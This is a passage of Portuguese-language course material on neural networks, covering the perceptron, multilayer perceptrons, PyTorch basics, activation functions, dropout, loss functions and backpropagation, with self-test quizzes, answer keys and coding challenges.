 Resumo de Textos: podem condensar longos documentos em resumos 
curtos e precisos. 
 Geração de Linguagem Natural: geram texto fluente e coerente, como 
histórias, artigos, ou respostas a perguntas. 
A arquitetura Transformer tem se mostrado eficaz em capturar relações 
contextuais em dados sequenciais de maneira mais eficiente do que as RNNs, o 
que levou a sua ampla adoção em diversas aplicações de inteligência artificial. 
Nesta disciplina focaremos na arquitetura mais simples: Redes Neurais 
Feedforward (FNN).  

 
 
Aprenda Mais:   
O que é uma rede neural? Disponível em: https://www.elastic.co/pt/what-
is/neural-network 
 
 
 
Questão 1: Qual das seguintes opções descreve o principal objetivo de uma rede 
neural?  
a) Reproduzir exatamente o comportamento do cérebro humano. 
b) Resolver problemas utilizando algoritmos baseados em lógica booleana. 
c) Aprender padrões a partir de dados fornecidos. 
d) Classificar imagens apenas em casos de problemas lineares. 
 
Questão 2: Um neurônio artificial realiza o seguinte cálculo básico:  
a) Multiplica as entradas pelos pesos, aplica uma função de ativação e gera a 
saída. 
b) Subtrai os valores das entradas pelos pesos e gera a saída diretamente. 
c) Soma todas as entradas e retorna o valor diretamente, sem função de 
ativação. 
d) Classifica as entradas com base em uma função de ativação fixa, sem ajuste 
de pesos. 
 
Questão 3: Em uma rede neural, qual é a função dos pesos de conexão?  
a) Ajustar o impacto de cada entrada no valor de saída do neurônio. 
b) Regular a frequência de ativação do neurônio. 
c) Definir o tipo de função de ativação usada pelo neurônio. 
d) Controlar o número de camadas da rede neural. 
 
Questão 4: O viés (bias) em um neurônio artificial tem a função de:  
a) Definir a frequência de atualização dos pesos durante o treinamento. 
b) Ajustar a função de ativação, permitindo ativação do neurônio mesmo com 
entradas zeradas. 
c) Impedir que o neurônio seja ativado caso todas as entradas sejam positivas. 
d) Limitar a quantidade de dados que o neurônio pode processar. 
 
Questão 5: Qual é a característica que distingue o Perceptron de outras 
arquiteturas de rede neural?  
a) Utiliza uma função de ativação contínua como a ReLU. 
b) Só consegue classificar problemas linearmente separáveis. 
c) É capaz de resolver problemas não lineares complexos. 
 
Testando seu conhecimento 
 

 
 
d) Não utiliza pesos ou viés em sua estrutura. 
 
Questão 6: A função do somatório em um neurônio artificial é:  
a) Aplicar uma função de ativação não linear às entradas. 
b) Somar as entradas ponderadas pelos pesos e adicionar o viés. 
c) Multiplicar todas as entradas e retorná-las diretamente. 
d) Ajustar os pesos de conexão durante o treinamento. 
 
Questão 7: Durante o treinamento de uma rede neural, os pesos são ajustados 
para:  
a) Maximizar a saída de cada neurônio em relação às entradas. 
b) Minimizar o erro entre a saída prevista e a saída esperada. 
c) Garantir que a rede gere sempre as mesmas previsões para entradas 
diferentes. 
d) Aumentar a complexidade do modelo, tornando-o mais difícil de ser 
interpretado. 
 
 
Respostas: 
 
Questão 1: c)  
Questão 2: a)  
Questão 3: a)  
Questão 4: b) 
Questão 5: b)  
Questão 6: b)  
Questão 7: b)  
 
Desafio: Altere o código do Perceptron da imagem para devolver, ao 
invés da soma, o valor 0 se a soma for menor que um threshold de 10. E retornar 
1 se for maior ou igual a 10. 
 
 

 
 
UNIDADE 2 REDE MULTILAYER PERCEPTRON 
Nesta unidade será abordado o processo de treinamento de uma rede neural, 
em especial a Rede Neural MultiLayer Perceptron. 
. 
OBJETIVOS DA UNIDADE 2  
Ao final dos estudos, você deverá ser capaz de: 
 Compreender o que é uma Rede Neural MultiLayer Perceptron 
 Entender o passo de criar camadas em uma rede neural 
 Entender a propagação direta (forward propagation). 
 Implementar uma arquitetura de rede simples utilizando PyTorch 
 
 
 

 
 
2.1 A IMPORTÂNCIA DAS CAMADAS EM UMA REDE NEURAL 
As redes Neural Feedforward (FNN) são um tipo de rede neural onde a 
informação se propaga apenas em uma direção, dos neurônios de entrada para 
os de saída, sem ciclos ou loops. A sua arquitetura pode incluir uma única 
camada oculta ou várias camadas ocultas, mas o ponto chave é que não há 
realimentação ou conexões recorrentes. 
 
Figura 7: Rede Neural com diversas camadas 
Fonte: https://www.researchgate.net/figure/Rede-Neural-Artificial-com-3-
camadas-A-arquitetura-de-rede-adotada-neste-trabalho-
possui_fig1_305212719 
Em problemas reais e complexos, os neurônios são organizados em camadas, 
e cada uma desempenha um papel específico no processamento dos dados 
dentro da rede neural. As redes neurais multicamadas, como é o caso das FNN, 
permitem que padrões complexos sejam aprendidos e identificados, algo que 
redes de camada única não conseguem realizar. Na arquitetura de uma rede 
neural, essas camadas podem ser descritas da seguinte forma. 
 Camada de Entrada: Recebe os dados iniciais e os transmite para as 
camadas subsequentes. Cada neurônio na camada de entrada representa 
uma característica do dado de entrada, como os pixels de uma imagem. 
 Camadas Ocultas (escondidas): Realizam cálculos intermediários e 
transformações nos dados. Cada camada oculta captura diferentes níveis 
de abstração dos dados. Em uma rede neural profunda, essas camadas 
ocultas permitem a detecção de padrões muito complexos. Por exemplo, 
em uma rede que reconhece rostos, as primeiras camadas podem 
detectar bordas e texturas, enquanto as camadas mais profundas podem 
reconhecer formas como olhos e boca. 
 Camada de Saída: Produz o resultado final, como uma classificação ou 
uma previsão. O número de neurônios na camada de saída depende do 

 
 
problema em questão. Por exemplo, em uma tarefa de classificação 
binária, a camada de saída pode ter um único neurônio com uma função 
de ativação sigmoide para retornar a probabilidade de uma classe. 
Sendo assim, podemos resumir que, uma rede de camada única possui as 
entradas ligadas diretamente nos neurônios de saída, já uma rede de múltiplas 
camadas possui camadas intermediárias e permite que os dados passem por 
várias 
transformações 
antes 
de 
chegar 
à 
saída, 
o 
que 
aumenta 
significativamente a capacidade da rede de modelar relações não lineares, 
conforme ilustrado na Figura 8.  
 
Figura 8: Rede Neural com camada única (esquerda) e com múltiplas camadas 
(direita) 
 
2.2 PERCEPTRON MULTICAMADA 
A FNN é um termo genérico que pode englobar diversos tipos de redes neurais, 
inclusive as redes Perceptron (com uma camada) e MultiLayer Perceptron (MLP) 
(com várias camadas). 
MultiLayer Perceptron (MLP), ou  perceptron multicamadas em português, é um 
dos modelos mais fundamentais de redes neurais. Ele é composto por uma 
camada de entrada, uma ou mais camadas ocultas e uma camada de saída.  
O MLP utiliza funções de ativação não lineares, como a função ReLU (Rectified 
Linear Unit), para permitir que a rede aprenda padrões complexos, o que o torna 
mais poderoso do que o perceptron simples, que só resolve problemas 
linearmente separáveis. 
O principal motivo pelo qual o MLP é poderoso é sua habilidade de ajustar os 
pesos e vieses dos neurônios para modelar funções não lineares. No processo 
de treinamento o MLP utiliza algoritmos de retropropagação e gradiente 
descendente para ajustar os pesos, o que é uma técnica comum em redes 
neurais mais complexas. 

 
 
Dessa forma, para definir uma arquitetura de MLP, é importante especificar os 
seguintes elementos: 
 
O número de camadas ocultas 
 
A quantidade de neurônios em cada camada 
 
A função de ativação utilizada 
 
O algoritmo de aprendizado, como o gradiente descendente 
 
 
2.3 INTRODUÇÃO AO PYTORCH 
 
Antes de aprender a treinar uma rede MLP é preciso falar sobre o framework que 
vamos usar: O PyTorch. O PyTorch é uma biblioteca de aprendizado profundo 
amplamente utilizada para a construção e treinamento de redes neurais. 
Desenvolvida pelo laboratório de pesquisa em inteligência artificial do Facebook 
(Meta AI), ela é conhecida por sua simplicidade e flexibilidade, sendo ideal tanto 
para pesquisas quanto para a implementação de modelos de aprendizado 
profundo em ambientes de produção. 
 
O PyTorch oferece diversas vantagens no treinamento de redes neurais, entre 
elas se desrtacam: 
 Diferenciação Automática (Autograd): Um dos aspectos mais 
importantes do PyTorch é o suporte à diferenciação automática, através 
do módulo autograd. Isso significa que, ao definir o modelo, o PyTorch 
automaticamente calcula os gradientes necessários para ajustar os pesos 
durante o processo de retropropagação, simplificando o processo de 
treinamento de redes neurais.  
 Tensores Otimizados para GPU: O PyTorch permite o uso de tensores, 
estruturas de dados que são semelhantes a arrays do NumPy, mas 
otimizadas para serem usadas em GPUs. Isso acelera o treinamento de 
redes neurais, especialmente para modelos grandes e complexos, já que 
GPUs são projetadas para lidar com operações em paralelo de maneira 
eficiente. 
 

 
 
2.3.1 FRAMEWORKS DE TREINAMENTO DE REDES NEURAIS 
Embora o PyTorch seja amplamente utilizado, há outras bibliotecas que 
desempenham papéis importantes no treinamento de redes neurais. Aqui estão 
três outras opções populares: 
 TensorFlow: Desenvolvido pela Google, oferece grande flexibilidade e 
poder, mas sua curva de aprendizado pode ser um pouco mais íngreme 
que a do PyTorch. TensorFlow é frequentemente utilizado em grandes 
projetos de produção. 
 Keras: inicialmente um projeto independente, agora integrado ao 
TensorFlow. O Keras é uma API de alto nível para redes neurais, que 
facilita a construção de modelos com menos código e abstrações 
simplificadas. Envolve camadas e operações comumente usadas em 
aprendizado profundo, organizando-as em blocos de construção simples. 
No entanto, para projetos que exigem maior controle e otimização, pode 
ser necessário acessar o backend subjacente, como TensorFlow ou 
Theano. 
 MXNet: Suportado pela Amazon Web Services (AWS), o MXNet é outra 
biblioteca que suporta o treinamento distribuído em larga escala, 
tornando-o uma escolha popular para grandes corporações. Embora 
menos popular que PyTorch e TensorFlow, ele tem suporte robusto para 
computação em nuvem, especialmente no AWS. 
 
Comparando o Keras e o PyTorch que são bibliotecas muito usadas, Piotr Migdal 
e Rafał Jakubanis do site deepsense.ai, afirmam que: 
“Keras é um framework de nível mais alto que envolve camadas e 
operações comumente usadas em aprendizado profundo, 
organizando-as em blocos de construção simples, como peças de 
lego, abstraindo as complexidades do aprendizado profundo dos 
olhos preciosos de um cientista de dados. PyTorch oferece um 
ambiente de nível mais baixo para experimentação, dando ao 
usuário mais liberdade para escrever camadas personalizadas e 
explorar os detalhes das tarefas de otimização numérica”.  
 
Piotr Migdal e Rafał Jakubanis  inclusive fazem uma comparação direta de uma 
rede convolucional simples definida em Keras e PyTorch: 

 
 
 
Fonte: https://deepsense.ai/keras-or-pytorch/ 
 
Aprenda Mais:   
Tutorial PyTorch: um guia rápido para você entender agora os 
fundamentos do PyTorch Disponível em: https://www.insightlab.ufc.br/tutorial-
pytorch-um-guia-rapido-para-voce-entender-agora-os-fundamentos-do-pytorch/ 
 
2.3.2 ESTRUTURA BÁSICA DO PYTORCH 
A estrutura básica do PyTorch gira em torno do conceito de tensores. Um tensor 
no PyTorch é uma estrutura de dados que pode ser vista como uma 
generalização de matrizes e arrays. Tensores são fundamentais para 
representar dados de entrada e saída, bem como para armazenar os pesos e 
gradientes das redes neurais. 
Um dos grandes benefícios do PyTorch é que esses tensores podem ser 
manipulados tanto em CPUs quanto em GPUs, o que acelera o processamento 
e o treinamento de grandes modelos.  
Aqui está um exemplo básico de criação de um tensor no PyTorch: 

 
 
 
O código a seguir mostra formas diferenciadas de criar um tensor usando o 
PyTorch. 
 
 

 
 
 
 
2.4 TREINAMENTO DE REDES NEURAIS 
O treinamento de redes neurais é um processo iterativo cujo objetivo é ajustar 
os pesos e vieses dos neurônios de forma a minimizar o erro entre as previsões 
da rede e os valores reais (esperados). A função de erro, também chamada de 
função de perda, é uma métrica que mede a discrepância entre a previsão da 
rede e a verdade, e o objetivo do treinamento é reduzir essa perda ao máximo. 
Para minimizar a função de perda, são utilizados algoritmos de otimização, 
sendo o mais comum o gradiente descendente. Este algoritmo ajusta os pesos 
da rede iterativamente, seguindo a direção oposta ao gradiente da função de 
perda. O gradiente indica a inclinação da função de perda em relação aos pesos, 
ou seja, mostra como modificar os pesos para reduzir a perda. 
No treinamento, o processo se baseia nos seguintes passos: 
 Propagação direta (Forward Propagation): Os dados de entrada são 
passados pela rede, e uma previsão é gerada na saída. 
 Cálculo da perda (Erro): Com base na previsão gerada, a função de 
perda é calculada, comparando a previsão com o valor real esperado. 
 Retropropagação (Backpropagation): Utilizando a regra da cadeia e o 
gradiente descendente, os erros são propagados de volta pela rede, 
ajustando os pesos de cada camada. 
 Atualização dos Pesos: Os pesos e vieses são ajustados para reduzir a 
função de perda. Dependendo do algoritmo de otimização escolhido 
(como Adam, SGD, RMSprop), a forma como os pesos são ajustados 
pode variar. 

 
 
Esse processo é repetido várias vezes (chamadas épocas) até que a função de 
perda atinja um valor mínimo aceitável ou os pesos se estabilizem. A cada 
época, a rede aprende mais sobre os padrões presentes nos dados de 
treinamento, ajustando seus parâmetros para melhorar a acurácia. 
 
Figura 9: Etapas de Treinamento de uma rede MLP 
 
Vamos agora explicar cada uma dessas etapas e mostrar como implementar no 
PyTorch. 
2.5 PROPAGAÇÃO DIRETA (FORWARD PROPAGATION) 
A propagação direta (forward propagation) é a primeira etapa no ciclo de 
treinamento de uma rede neural. Nesse processo, os dados de entrada são 
passados pela rede, camada por camada, até chegar à camada de saída, onde 
uma previsão é feita. As ativações de cada camada são calculadas com base 
nos pesos e nas funções de ativação, gerando uma previsão final na saída. 
 
2.5.1 CRIANDO A ESTRUTURA DE CAMADAS 
A construção de uma rede neural MLP no PyTorch segue uma estrutura modular, 
onde criamos classes herdando de torch.nn.Module, e definimos as camadas da 

 
 
rede no método __init__. A propagação de dados (forward pass) é implementada 
no método forward. 
Exemplo simples de uma rede neural totalmente conectada: 
 
Nesse exemplo, a rede possui: 
 uma camada de entrada totalmente conectada (nn.Linear) com 10 
neurônios, seguida de uma camada oculta com 5 neurônios. 
 a função de ativação utilizada é a ReLU, que introduz não linearidades no 
modelo, permitindo que ele aprenda padrões mais complexos. 
 o método forward define a passagem dos dados através das camadas da 
rede. 
2.5.1 INICIALIZAÇÃO DOS PESOS 
A inicialização dos pesos é um aspecto crítico no desempenho e treinamento 
eficiente de uma rede neural. Pesos mal inicializados podem resultar em diversos 
problemas, como convergência lenta ou a rede ficar presa em mínimos locais 
durante o processo de otimização. Se os pesos forem muito grandes, podem 
causar gradientes explosivos, e se forem muito pequenos, podem levar ao 
problema de gradientes desaparecendo (vanishing gradients), tornando o 
aprendizado extremamente ineficiente. 
A inicialização de pesos aleatórios, mas com um controle adequado, é uma 
prática padrão para garantir que a rede comece o treinamento de maneira 

 
 
eficiente. Estratégias modernas de inicialização de pesos, como a inicialização 
Xavier (também conhecida como Glorot initialization) ou a inicialização He, foram 
projetadas para lidar com esses desafios, promovendo uma distribuição de 
pesos que ajuda a manter os gradientes estáveis conforme eles são propagados 
para trás através da rede. 
No PyTorch, você pode aplicar essa inicialização manualmente aos parâmetros 
do modelo, como demonstrado no código abaixo: 
 
Neste exemplo de trecho de código, a função inicializa_pesos poderia ser usada 
para inicializar os pesos de um modelo de uma rede neural. A inicialização 
empregada é a Xavier_uniform para os pesos e o bias está sendo inicializado 
com zero. A inicialização do bias como zero é uma prática comum, pois o bias é 
responsável por ajustar a ativação da rede e, ao começar com zero, evita que a 
rede tenha um comportamento enviesado antes do início do treinamento. 
A inicialização Xavier (Glorot) é uma técnica que define a distribuição dos pesos 
de forma que a variância dos valores na saída de cada camada seja mantida 
aproximadamente constante. Isso ajuda a mitigar o problema dos gradientes 
desaparecendo ou explodindo, especialmente em redes com muitas camadas. 
Na inicialização Xavier, os pesos são amostrados de uma distribuição uniforme 
ou normal, com limites calculados a partir do número de unidades (neurônios) na 
camada anterior e na camada atual. 
Para uma inicialização uniforme, a fórmula usada para calcular os limites da 
distribuição uniforme é: 

 
 
 
 
2.5.2 FUNÇÃO DE ATIVAÇÃO 
 
As funções de ativação em redes neurais desempenham um papel importante 
ao decidir se um neurônio deve ser "ativado" ou não, isto é, se sua saída será 
propagada para a próxima camada da rede. A principal função dessas ativações 
é introduzir não-linearidade ao sistema, o que permite que a rede modele 
relações complexas entre as variáveis de entrada e saída. Sem essa não-
linearidade, as redes neurais seriam apenas combinações lineares das entradas, 
independentemente do número de camadas, e perderiam a capacidade de 
capturar padrões mais sofisticados nos dados. 
As funções de ativação transformam a soma ponderada das entradas do 
neurônio em uma saída que será usada pela próxima camada da rede. A escolha 
da função de ativação pode influenciar significativamente o desempenho do 
modelo, e cada função é mais adequada para tipos específicos de tarefas 
Como visto anteriormente, as funções mais comuns são: 
 
ReLU (Rectified Linear Unit): Retorna zero para valores negativos e o 
próprio valor para positivos. ReLU ajuda a evitar o problema de gradientes 
desaparecendo, comum em funções como a sigmoide e a tangente 
hiperbólica, tornando o treinamento mais rápido. Produz resultados no 
intervalo [0, ∞[. É uma função não linear. 
 

 
 
 
 
Sigmoide: Transforma a saída em um valor entre 0 e 1, ideal para 
problemas de classificação binária. Boa para modelos que precisam de 
saídas probabilísticas, especialmente na última camada em problemas de 
classificação binária. Função não linear suave que é capaz de lidar com 
apenas duas classes. 
 
 
 
 
TanH (Tangente Hiperbólica): Produz valores entre -1 e 1, útil para redes 
que necessitam de saídas negativas e positivas. 
 
Aqui está um exemplo de como as funções de ativação podem ser usadas em 
uma rede neural implementada em PyTorch: 

 
 
 
 nn.Sigmoid(), nn.Tanh(), e nn.ReLU(): Essas são as funções de ativação 
disponíveis no PyTorch, e elas podem ser aplicadas diretamente às 
entradas. 
 
2.5.3 DROPOUT 
Dropout é uma técnica utilizada em redes neurais para prevenir o overfitting—o 
fenômeno em que a rede se ajusta muito bem aos dados de treinamento, mas 
tem dificuldade em generalizar para novos dados : Neurônios co-adaptam seus 
aprendizados em relação a outros neurônios. O dropout evita que os neurônios 
fiquem altamente correlacionados, aumentando a capacidade da rede de 
generalizar melhor. 
Durante o treinamento, o dropout "desativa" aleatoriamente uma fração dos 
neurônios em uma camada de uma rede neural, geralmente com uma 
probabilidade definida, como 50% ou 20%. Isso força a rede a distribuir o 
aprendizado entre todos os neurônios, em vez de depender excessivamente de 
neurônios específicos.  
O efeito do dropout é similar ao de treinar diversas redes menores e 
independentes, e essa diversificação de aprendizado é recomposta durante a 
inferência, quando todos os neurônios estão ativos, mas com pesos escalados. 
Durante a fase de inferência (avaliação/teste), o dropout não é aplicado. No 
entanto, para compensar a ausência do dropout durante a inferência, os pesos 
das conexões são escalados proporcionalmente à probabilidade de dropout 
utilizada durante o treinamento. Por exemplo, se o dropout com p=0.5 (50%) foi 
utilizado no treinamento, os pesos da rede são escalados por um fator de 1/(1-
p) durante a inferência para manter a consistência do aprendizado. 
No PyTorch, o dropout pode ser aplicado de maneira muito simples utilizando o 
módulo nn.Dropout. Você pode especificar a probabilidade p de "desativar" os 
neurônios durante o treinamento. No exemplo abaixo, a probabilidade de dropout 

 
 
foi definida como 50% (p=0.5), o que significa que, em média, metade dos 
neurônios será desativada a cada iteração de treinamento. 
 
 
2.5.4 CÁLCULO DA PERDA 
 
O cálculo da perda em redes neurais é um dos passos mais importantes durante 
o processo de treinamento. A função de perda (também chamada de função de 
custo) mede o quanto as previsões feitas pela rede neural diferem dos valores 
reais, ou seja, o quão longe o modelo está da solução correta. O objetivo do 
treinamento é minimizar essa função de perda, ajustando os pesos da rede de 
forma que as previsões se tornem cada vez mais precisas. 
Existem diferentes funções de perda que podem ser usadas, dependendo do tipo 
de problema que se está tentando resolver. As mais comuns são: 
 Erro Quadrático Médio (Mean Squared Error - MSE): Muito utilizada em 
problemas de regressão, o MSE calcula a média dos quadrados das 
diferenças entre as previsões da rede e os valores reais. A fórmula do 
MSE é: 
 
Onde yi são os valores reais, ŷi são os valores previstos pela rede e n é o 
número de exemplos. O MSE penaliza grandes erros de previsão, já que 
eleva ao quadrado as diferenças entre as previsões e os valores reais. 

 
 
 Entropia Cruzada (Cross-Entropy Loss): Usada em problemas de 
classificação, especialmente classificação binária e multiclasse. A 
entropia cruzada mede a divergência entre a distribuição prevista pela 
rede (as probabilidades atribuídas às diferentes classes) e a distribuição 
real. Em uma tarefa de classificação binária, a fórmula da entropia cruzada 
é: 
 
Onde yi é o rótulo real (0 ou 1), ŷi  é a probabilidade prevista pela rede de 
que a observação pertença à classe 1, e n é o número de exemplos. A 
entropia cruzada penaliza fortemente previsões com baixa confiança em 
relação à classe correta. 
Esse código a seguir mostra como definir e calcular a função de perda em um 
modelo de rede neural usando PyTorch. Neste caso, duas funções de perda são 
apresentadas: Erro Quadrático Médio (MSE) e Entropia Cruzada Binária (BCE), 
cada uma apropriada para diferentes tipos de problemas. 
 
Aprenda Mais:   
Redes Neurais com PyTorch.  
Disponível em: https://colab.research.google.com/github/storopoli/ciencia-de-
dados/blob/main/notebooks/Aula_18_b_Redes_Neurais_com_PyTorch.ipynb 
 

 
 
 
 
Questão 1: Qual o principal objetivo do processo de treinamento de uma rede 
neural? 
a) Maximizar a função de perda. 
b) Minimizar o erro entre as previsões da rede e os valores reais. 
c) Aumentar o número de camadas da rede neural. 
d) Eliminar a função de ativação para tornar o modelo linear. 
 
Questão 2: O que é o PyTorch?  
a) Um framework de otimização de redes neurais com foco em redes 
convolucionais. 
b) Um framework de aprendizado profundo conhecido pela simplicidade e 
flexibilidade. 
c) Uma biblioteca de matemática discreta aplicada em aprendizado de máquina. 
d) Um framework especializado em redes neurais adversárias. 
 
Questão 3: Qual a função dos tensores no PyTorch?  
a) Representar funções de ativação em redes neurais. 
b) Substituir as camadas ocultas nas redes neurais. 
c) Representar os dados de entrada e saída, com suporte para GPUs. 
d) Calcular automaticamente o gradiente descendente. 
 
Questão 4: O que ocorre durante a propagação direta (forward propagation)?  
a) O cálculo do gradiente de cada camada da rede neural. 
b) Os dados são passados pela rede, camada por camada, gerando uma 
previsão final. 
c) A rede ajusta os pesos dos neurônios para minimizar o erro. 
d) O cálculo da perda e a retropropagação. 
 
Questão 5: Por que a inicialização correta dos pesos é importante no treinamento 
de uma rede neural?  
a) Porque uma má inicialização pode causar instabilidade no processo de 
retropropagação. 
b) Porque impede a rede de aprender padrões complexos. 
c) Porque garante que a rede tenha uma saída constante. 
d) Porque determina a função de ativação utilizada pela rede. 
 
Questão 6: O que a função de ativação ReLU (Rectified Linear Unit) faz?  
a) Garante que a saída seja sempre entre 0 e 1. 
b) Ativa o neurônio apenas se a entrada for negativa. 
c) Retorna zero para valores negativos e o próprio valor para positivos. 
d) Mapeia a entrada para um valor entre -1 e 1. 
 
 
Testando seu conhecimento 
 

 
 
Questão 7: Quando a função sigmoide é mais adequada?  
a) Em problemas de regressão contínua. 
b) Quando a saída da rede deve ser entre -1 e 1. 
c) Em problemas de classificação binária, onde a saída deve ser entre 0 e 1. 
d) Para redes neurais recorrentes. 
 
Questão 8: Qual é o principal objetivo do Dropout em uma rede neural?  
a) Aumentar o número de neurônios em cada camada. 
b) Desativar aleatoriamente uma fração de neurônios durante o treinamento para 
evitar overfitting. 
c) Reduzir o tempo de treinamento da rede. 
d) Aumentar a precisão da rede em problemas de classificação. 
 
Questão 9: Qual das opções a seguir descreve corretamente o cálculo de perda 
usando o Erro Quadrático Médio (MSE)?  
a) Penaliza pequenas diferenças entre as previsões e os valores reais. 
b) Calcula a diferença média entre as previsões e os valores reais sem penalizar 
grandes erros. 
c) Calcula a média dos quadrados das diferenças entre as previsões e os valores 
reais. 
d) Gera a perda com base na probabilidade de uma classe específica. 
 
Questão 10: Qual a função da Entropia Cruzada (Cross-Entropy Loss) em redes 
neurais?  
a) Maximizar a probabilidade de todas as classes em problemas de classificação. 
b) Medir a divergência entre a distribuição prevista e a distribuição real. 
c) Gerar previsões de valores contínuos em problemas de regressão. 
d) Reduzir o número de camadas da rede neural para evitar overfitting. 
 
Questão 11: Qual das funções de ativação a seguir é mais adequada para redes 
neurais que necessitam de saídas tanto positivas quanto negativas?  
a) Sigmoide 
b) ReLU 
c) TanH 
d) Função degrau 
 
Questão 12: Por que o uso de GPUs é vantajoso no PyTorch?  
a) Porque permite a utilização de mais funções de ativação não-lineares. 
b) Porque otimiza a execução de operações matemáticas envolvendo tensores 
de forma paralela. 
c) Porque reduz o número de parâmetros treináveis na rede neural. 
d) Porque permite que o PyTorch use menos memória durante o treinamento. 
 
 
 
Respostas: 
 
Questão 1: b)  
Questão 2: b) 

 
 
Questão 3: c)  
Questão 4: b)  
Questão 5: a) 
Questão 6: c)  
Questão 7: c)  
Questão 8: b)  
Questão 9: c)  
Questão 10: b)  
Questão 11: c)  
Questão 12: b)  
 
 
Desafio: Monte a arquitetura simples de uma rede neural totalmente 
conectada com três camadas ocultas densas com 100, 50 e 20 neurônios, 
respectivamente e nessa ordem. Coloque uma camada de dropout entre a 
segunda e a terceira e uma função de ativação ReLU depois da primeira camada 
oculta. 
 
 
 
 

 
 
UNIDADE 3 RETROPROPAGAÇÃO (BACKPROPAGATION) 
Nesta unidade será abordado a segunda etapa do processo de treinamento de 
uma Rede Neural MultiLayer Perceptron. Será apresentado o algoritmo 
retropropagação (ou backpropagation). 
. 
OBJETIVOS DA UNIDADE 3  
Ao final dos estudos, você deverá ser capaz de: 
 Entender a retropropagação (ou backpropagation) 
 Entender o processo de atualização dos pesos com base no erro 
 Treinar uma rede neural simples utilizando PyTorch 
 
 
 

 
 
A retropropagação (ou backpropagation) é o algoritmo central utilizado no 
treinamento de redes neurais artificiais. Ela permite que a rede ajuste seus pesos 
com base no erro entre a previsão do modelo e os valores reais esperados 
(rótulos). Esse ajuste é feito para minimizar a função de perda, que quantifica a 
diferença entre a previsão da rede e o valor correto. O objetivo principal é que, 
ao final do treinamento, a rede aprenda padrões nos dados de entrada que 
possam ser aplicados a novos dados, generalizando o aprendizado. 
 
Como Funciona a Retropropagação 
 Propagação Direta (Forward Pass): Como visto na Unidade 2, na fase 
de propagação direta, os dados de entrada passam pelas camadas da 
rede e produzem uma previsão na camada de saída. 
 Cálculo da Perda: A diferença entre a previsão do modelo e o valor real 
é calculada usando uma função de perda. Quanto maior a perda, maior a 
diferença entre a previsão e o valor correto. 
 Retropropagação do Erro: O erro calculado na função de perda é 
propagado para trás, desde a camada de saída até as camadas 
anteriores, usando a regra da cadeia (derivadas parciais). O objetivo é 
calcular o gradiente da função de perda em relação a cada peso da rede. 
 Ajuste dos Pesos: Utilizando esses gradientes, os pesos da rede são 
ajustados em pequenas quantidades, de forma a minimizar a função de 
perda. Esse processo se repete a cada iteração, fazendo com que a rede 
fique melhor a cada passo. 
 
 
 
3.1 GRADIENTE DESCENDENTE 
O gradiente descendente é o método de otimização utilizado para ajustar os 
pesos da rede durante a retropropagação. O gradiente descendente procura a 

 
 
direção que minimiza a função de perda, seguindo o gradiente negativo da 
função. Em outras palavras, ele ajusta os pesos na direção oposta ao gradiente, 
pois essa é a direção em que a perda diminui mais rapidamente. 
Existem várias variantes do gradiente descendente, que podem ser aplicadas 
dependendo da natureza do problema e dos recursos disponíveis: 
 Gradiente Descendente Estocástico (SGD): Neste método, os pesos 
são atualizados após cada exemplo de treinamento. Embora introduza 
variação nas atualizações (devido à aleatoriedade dos exemplos), o SGD 
pode acelerar o processo de convergência, especialmente em grandes 
conjuntos de dados. 
 Gradiente Descendente com Mini-batches: Aqui, os dados de 
treinamento são divididos em pequenos lotes (mini-batches). Cada lote é 
usado para calcular o gradiente e atualizar os pesos. Isso combina a 
eficiência do SGD com a estabilidade do gradiente descendente em lote 
completo, garantindo um treinamento mais suave e eficiente. 
 Gradiente Descendente com Momento: Introduz um termo de 
aceleração, chamado de "momento", que permite que o algoritmo evite 
mínimos locais e acelere a convergência. O momento atua como uma 
força que "empurra" a atualização dos pesos para direções que 
apresentam um gradiente consistente, acumulando o movimento de 
iterações anteriores. 
O PyTorch oferece uma variedade de otimizadores prontos para uso, que 
implementam essas variantes do gradiente descendente. Alguns dos 
otimizadores mais comuns incluem: 
 
 SGD: O otimizador de gradiente descendente estocástico básico. 
 Adam (Adaptive Moment Estimation): Uma variante popular que 
combina o conceito de momentum com a adaptação de taxas de 
aprendizado para cada parâmetro. Ele ajusta a taxa de aprendizado com 
base na magnitude dos gradientes, o que o torna muito eficiente e 
amplamente utilizado. 
 RMSprop: Otimizador que ajusta a taxa de aprendizado com base na 
média dos gradientes ao longo do tempo. É ideal para problemas onde os 
gradientes variam bastante em magnitude. 
Aqui está um exemplo de como inicializar um otimizador no PyTorch: 

 
 
 
 
Outro fatores que influenciam o treinamento é a taxa de aprendizado (learning 
rate). Um hiperparâmetro que define o tamanho do passo que o algoritmo de 
otimização dá ao ajustar os pesos. Uma taxa muito alta pode fazer o modelo 
"pular" o ponto ótimo, enquanto uma taxa muito baixa pode resultar em um 
treinamento muito lento. 
Estratégias comuns para lidar com a escolha da taxa de aprendizado incluem: 
 
Taxas de aprendizado adaptativas: Algoritmos como o Adagrad, 
RMSprop e Adam ajustam a taxa de aprendizado dinamicamente durante 
o treinamento, de acordo com o comportamento do gradiente. Isso 
permite que o modelo faça ajustes mais eficazes, evitando problemas com 
taxas de aprendizado mal calibradas. 
 
Decaimento da taxa de aprendizado: Outro método é usar uma taxa de 
aprendizado que diminui gradualmente ao longo do treinamento, 
permitindo grandes ajustes no início e refinamentos menores à medida 
que o treinamento progride. 
 
No processo de atualização dos pesos esses são ajustados com base no 
gradiente descendente para minimizar o erro na próxima iteração. 
 
 
Este ciclo se repete até que a função de perda atinja um valor mínimo aceitável 
ou até que o número máximo de iterações seja atingido. O objetivo é que a rede 

 
 
seja capaz de generalizar seu aprendizado para novos dados, evitando o 
problema de overfitting (superajuste), onde o modelo "memoriza" os dados de 
treinamento e não consegue lidar com dados nunca antes vistos. 
O código abaixo implementa o treinamento de um modelo de rede neural simples 
usando o PyTorch que segue todas essas etapas, considerando que a 
arquitetura SimpleNN já foi definida na Unidade 2. 
 
Importando bibliotecas 
 torch: Biblioteca principal do PyTorch, usada para operações de tensores, 
definição de modelos e funções de perda. 
 torch.optim: Contém otimizadores, como o SGD, usados para atualizar os 
pesos do modelo durante o treinamento. 
Modelo e Dados de Exemplo 
 model = SimpleNN(): Inicializa um modelo criado chamado SimpleNN. O 
modelo é definido separadamente e é uma rede neural simples com 
camadas totalmente conectadas. 

 
 
 input_data: Gera um tensor aleatório com 10 exemplos de entrada, cada 
um com 10 características (features). Este é o conjunto de dados de 
entrada para o modelo. 
 target: Gera a saída esperada (valores-alvo) para o treinamento. Este 
tensor tem 10 exemplos, com uma única saída por exemplo. O valor que 
o modelo tenta prever. 
Função de Perda 
 nn.MSELoss(): Define a função de perda como Erro Quadrático Médio 
